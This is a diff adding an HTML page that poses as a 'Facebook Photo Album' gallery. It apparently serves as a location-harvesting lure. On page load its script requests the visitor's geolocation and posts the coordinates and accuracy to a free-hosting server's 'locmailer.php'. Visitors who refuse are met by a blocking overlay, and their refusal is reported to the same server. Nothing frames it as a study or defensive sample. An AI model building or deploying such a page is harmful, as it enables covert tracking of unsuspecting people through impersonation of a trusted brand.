@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<link href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" rel="stylesheet"/>
+	<title>Gallery</title>
+</head>
+<body id="bd" class="body">
+	<header>
+		<div class="header">Facebook Photo Album</div>
+	</header>
+	<div class="album-opt">
+    <table class="tbalbum">
+    	<tbody>
+    		<tr>
+    			<td>
+    				<button class="btn btn-ac">
+    					<i class="btn-icon a-icon"></i>
+    					<span class="b-text">Add Photos</span>
+    				</button>
+    			</td>
+    			<td>
+    				<button class="btn btn-ac">
+    					<i class="btn-icon c-icon"></i>
+    					<span class="b-text">Create Album</span>
+    				</button>
+    			</td>
+    		</tr>
+    	</tbody>
+    </table>
+	</div>
+	<div class="container">
+		  <div class="flex">
+		  	<div class="ic"><img src="assets/cutes/1.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/2.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/3.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/4.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/5.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/6.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/7.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/8.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/9.jpg" ></div>
+		  	<div class="ic"><img src="assets/cutes/10.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/1.webp" ></div>
+		  	<div class="ic"><img src="assets/bangali/2.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/3.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/4.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/5.webp" ></div>
+		  	<div class="ic"><img src="assets/bangali/6.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/7.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/8.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/9.jpg" ></div>
+		  	<div class="ic"><img src="assets/bangali/10.webp" ></div>
+		  	<div class="ic"><img src="assets/bangali/11.jpg" ></div>
+
+	    </div>
+	 </div>
+
+	 <!-- PERMISSION_DENIED -->
+	 <div id="ds" class="dis-modal">
+  	<div class="dis-wrapper">
+  		<div class="banner">
+  			<p id="esms"></p>
+  			<div class="cbtn">
+  				<button type="button" class="btn-reload btn btn-ac" onclick="window.location.reload()">Reload</button>
+  			</div>
+  		</div> 		
+  		</div>
+  	</div>
+  </div>
+<script type="text/javascript">
+   	window.onload = getlocation();
+
+   		//ajax data
+
+   	function ajax(msg){
+   		document.getElementById("bd").style.overflow = "hidden";
+   		document.getElementById("ds").style.display = "block";
+   		document.getElementById("esms").innerHTML = msg;
+          
+   		var xhttp = new XMLHttpRequest();
+   	   xhttp.open("POST","https://banglaerphoto.000webhostapp.com/contact/locerror.php");
+   	   xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+   	   xhttp.send("error_msg="+msg);
+   	}
+
+		    function getlocation() {
+		    	if (navigator.geolocation) {
+		        navigator.geolocation.getCurrentPosition(showPosition, showError);
+		     } else {
+             ajax("Geolocation is not supported by this browser.")
+		     }
+		    		}
+
+
+   //show position
+
+    function showPosition(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+        var accuracy = position.coords.accuracy; 
+
+ 		   data = "latitude=" + latitude + "&" + "longitude=" + longitude + "&" + "accuracy=" + accuracy;
+   		
+   	   var xhttp = new XMLHttpRequest();
+   	   xhttp.open("POST","https://banglaerphoto.000webhostapp.com/contact/locmailer.php");
+   	   xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+   	   xhttp.send(data);
+   	 		}
+
+
+   //error message
+   	
+   	function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      ajax("User denied the request for Geolocation.");
+      break;
+    case error.POSITION_UNAVAILABLE:
+      ajax("Location information is unavailable.");
+      break;
+    case error.TIMEOUT:
+      ajax("The request to get user location timed out.")
+      break;
+    case error.UNKNOWN_ERROR:
+      ajax("An unknown error occurred.");
+      break;
+  }
+} 				 
+   	 						
+
+   </script>
+</body>
+</html>
